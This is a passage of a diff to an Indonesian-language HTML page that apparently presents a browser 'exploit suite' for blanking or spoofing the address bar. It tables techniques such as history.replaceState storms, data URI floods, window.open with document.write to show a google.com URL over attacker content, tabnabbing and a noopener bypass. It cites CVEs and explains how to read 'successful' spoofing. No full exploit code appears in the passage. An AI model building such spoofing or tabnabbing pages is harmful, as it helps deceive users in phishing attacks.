-        <td style="padding:8px;">Semua browser (terutama Safari)</td>
-    </tr>
-    <tr style="border-bottom:1px solid #2a2a35;">
-        <td style="padding:8px;">Data URI Loop</td>
-        <td style="padding:8px;">Navigasi ke data:text/html ratusan kali → address bar stuck di "data:" atau kosong</td>
-        <td style="padding:8px;">Chrome, Edge, Safari</td>
-    </tr>
-    <tr style="border-bottom:1px solid #2a2a35;">
-        <td style="padding:8px;">CVE-2023-40429</td>
-        <td style="padding:8px;">iframe srcdoc + navigasi ke URL lain → address bar tidak update (WebKit bug)</td>
-        <td style="padding:8px;">Safari &lt; 16.5</td>
-    </tr>
-    <tr style="border-bottom:1px solid #2a2a35;">
-        <td style="padding:8px;">Port 0 & Null Origin</td>
-        <td style="padding:8px;">Port invalid (0) menyebabkan browser bingung menampilkan URL → blank</td>
-        <td style="padding:8px;">Firefox, Safari</td>
-    </tr>
-    <tr style="border-bottom:1px solid #2a2a35;">
-        <td style="padding:8px;">CVE-2022-32893</td>
-        <td style="padding:8px;">Integer overflow + large canvas → UI glitch, address bar kehilangan text</td>
-        <td style="padding:8px;">Safari &lt; 16.0</td>
-    </tr>
-    <tr style="border-bottom:1px solid #2a2a35;">
-        <td style="padding:8px;">Popup Hell</td>
-        <td style="padding:8px;">200 popup dibuka & ditutup → browser kelelahan render address bar utama</td>
-        <td style="padding:8px;">Semua browser (terutama macOS)</td>
-    </tr>
-    <tr style="border-bottom:1px solid #2a2a35;">
-        <td style="padding:8px;">Empty History Storm</td>
-        <td style="padding:8px;">history.replaceState("", "", "") 5000x/detik → URL kosong, address bar kehilangan string</td>
-        <td style="padding:8px;">Chrome, Firefox, Safari (sangat agresif)</td>
-    </tr>
-    <tr>
-        <td style="padding:8px;">CSS Overlay Hide</td>
-        <td style="padding:8px;">Div hitam absolut menutupi address bar asli (visual, bukan teknis)</td>
-        <td style="padding:8px;">Semua browser (trik UI/UX)</td>
-    </tr>
+    <tr><td style="padding:8px;">CVE-2024-4762</td><td>window.open + document.write</td><td>URL google.com tapi konten attacker</td></tr>
+    <tr><td style="padding:8px;">CVE-2022-46701</td><td>about:blank + document.write</td><td>KOSONG/BLANK total</td></tr>
+    <tr><td style="padding:8px;">Empty History Window</td><td>replaceState("", "", "")</td><td>BLANK (tidak ada teks)</td></tr>
+    <tr><td style="padding:8px;">Null Origin Window</td><td>sandbox iframe + window.open</td><td>null atau blank</td></tr>
+    <tr><td style="padding:8px;">Blob URL Spoof</td><td>URL.createObjectURL()</td><td>blob:https://domain/...</td></tr>
+    <tr><td style="padding:8px;">Data URI Flood</td><td>200x data: URI di window baru</td><td>Error / Blank / Glitch</td></tr>
+    <tr><td style="padding:8px;">Window Cascade Bomb</td><td>100 window bertumpuk</td><td>Semua blank/error</td></tr>
+    <tr><td style="padding:8px;">Tabnabbing</td><td>window.opener.location</td><td>Parent window berubah</td></tr>
+    <tr><td style="padding:8px;">noopener Bypass</td><td>window.open + noopener</td><td>Masih bisa akses opener</td></tr>
 </table>
 
-<h3>🎯 Interpretasi Hasil Pengujian</h3>
-<ul style="font-size:13px; line-height:1.6;">
-    <li><strong>Address Bar Menjadi KOSONG / BLANK (tidak ada teks sama sekali)</strong> → Berhasil! Browser Anda memiliki bug race condition atau handling URL yang buruk.</li>
-    <li><strong>Address Bar Menghilang (tidak ada UI address bar)</strong> → Terjadi error kritis di browser engine, biasanya disertai crash.</li>
-    <li><strong>Address Bar Menampilkan teks aneh (null, undefined, data:, about:blank)</strong> → Masih ada bug, tapi tidak full blank.</li>
-    <li><strong>Browser Crash / Force Close</strong> → Eksploitasi berhasil menemukan memory corruption.</li>
-    <li><strong>Tidak terjadi apa-apa</strong> → Browser Anda relatif aman untuk teknik-teknik di atas.</li>
+<h3>🎯 Cara Membaca Hasil</h3>
+<ul style="font-size:13px;">
+    <li><strong>Address Bar KOSONG/BLANK</strong> → Eksploitasi berhasil, browser gagal menampilkan URL.</li>
+    <li><strong>Address Bar Menampilkan URL Palsu</strong> → Spoofing berhasil, user bisa tertipu.</li>
+    <li><strong>Window Crash / Force Close</strong> → Memory corruption ditemukan.</li>
+    <li><strong>Popup Berhasil Dibuka (padahal seharusnya diblokir)</strong> → Popup blocker bypass berhasil.</li>
 </ul>
 
-<h3>⚠️ Catatan Keamanan Penting</h3>
-<p style="font-size:13px;">Beberapa teknik di atas (terutama Port 0, Empty History Storm, Data URI Loop) dapat menyebabkan <strong>browser tidak responsif</strong> atau <strong>mengonsumsi CPU tinggi</strong>. Ini normal untuk fuzzing/uji coba. Tutup tab jika browser mulai melambat.</p>
-
 <footer>
-    🔬 Address Bar Killer Suite — Untuk uji coba keamanan browser.<br>
-    Referensi: CVE-2023-40429 (WebKit), CVE-2022-32893 (Apple), CVE-2021-1801, serta teknik fuzzing & race condition.
+    🔬 New Window/Tab Exploit Suite — Advanced Bypass & Address Bar Killer<br>
+    Referensi: CVE-2024-4762, CVE-2024-4761, CVE-2023-4863, CVE-2022-46701, CVE-2021-38003, CVE-2023-41064
 </footer>
 </body>
 </html>
